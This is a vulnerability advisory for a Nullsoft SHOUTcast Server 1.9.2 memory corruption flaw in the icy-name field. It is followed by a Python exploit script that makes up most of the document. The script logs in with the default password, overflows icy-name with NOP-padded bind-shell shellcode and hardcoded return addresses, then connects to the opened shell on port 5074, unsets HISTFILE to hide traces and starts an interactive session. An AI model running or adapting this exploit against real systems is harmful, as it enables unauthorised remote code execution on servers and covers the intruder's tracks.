source: http://www.securityfocus.com/bid/8954/info

Nullsoft SHOUTcast Server is prone to a memory corruption vulnerability that may lead to denial of service attacks or code execution. This is due to insufficient bounds checking of server commands supplied by authenticated users, specifically icy-name and icy-url.

This issue was reported in SHOUTcast 1.9.2 on Windows platforms. Other versions and platforms may also be affected.

#test under gentoo linux ,exec it python shoutexp.py 192.168.0.1
#code by airsupply_at_0x557.org
#thx all sst members

import socket,string,base64
import sys
import telnetlib
import time
t_ip=sys.argv[1]
print t_ip
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((t_ip,8001))
except:
    sys.exit(-1)
########send get ip req####### 
s.send('changeme')
s.send('\r\n');
data=s.recv(1024)
print data
nop='\x90'

shellcode ='\x31\xc0'+\
'\x50'+\
'\x40'+\
'\x89\xc3'+\
'\x50'+\
'\x40'+\
'\x50'+\
'\x89\xe1'+\
'\xb0\x66'+\
'\xcd\x80'+\
'\x31\xd2'+\
'\x52'+\
'\x66\x68\x13\xd2'+\
'\x43'+\
'\x66\x53'+\
'\x89\xe1'+\
'\x6a\x10'+\
'\x51'+\
'\x50'+\
'\x89\xe1'+\
'\xb0\x66'+\
'\xcd\x80'+\
'\x40'+\
'\x89\x44\x24\x04'+\
'\x43'+\
'\x43'+\
'\xb0\x66'+\
'\xcd\x80'+\
'\x83\xc4\x0c'+\
'\x52'+\
'\x52'+\
'\x43'+\
'\xb0\x66'+\
'\xcd\x80'+\
'\x93'+\
'\x89\xd1'+\
'\xb0\x3f'+\
'\xcd\x80'+\
'\x41'+\
'\x80\xf9\x03'+\
'\x75\xf6'+\
'\x52'+\
'\x68\x6e\x2f\x73\x68'+\
'\x68\x2f\x2f\x62\x69'+\
'\x89\xe3'+\
'\x52'+\
'\x53'+\
'\x89\xe1'+\
'\xb0\x0b'+\
'\xcd\x80';
eax='\xe3\xd0\x06\x08';
ret='\x50\xd0\x06\x08';
icy_name='icy-name:'+nop*50+shellcode+nop*(141-len(shellcode))+ret+nop*4+eax+nop*105+eax+nop*200;
will_send= 'icy-genre:DoS radio\r\n'+\
           'icy-url:aaa\r\n'+\
           'icy-pub:1\r\n'+\
           'icy-irc:N/A\r\n'+\
           'icy-icq:N/A\r\n'+\
           'icy-aim:N/A\r\n'+\
           'icy-br:160'+\
           '\r\n'
           

s.send(will_send);
print 'send icy-name\n'
s.send(icy_name);
s.close()
time.sleep(1)
try:
    s2=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s2.connect((t_ip,5074))
except:
    print "s2 fuck out\n"
    sys.exit(-1)
s2.send("unset HISTFILE;id;\n");
recvdata=s2.recv(100);
print recvdata
t=telnetlib.Telnet();
t.sock=s2;
t.interact();
sys.exit(-1);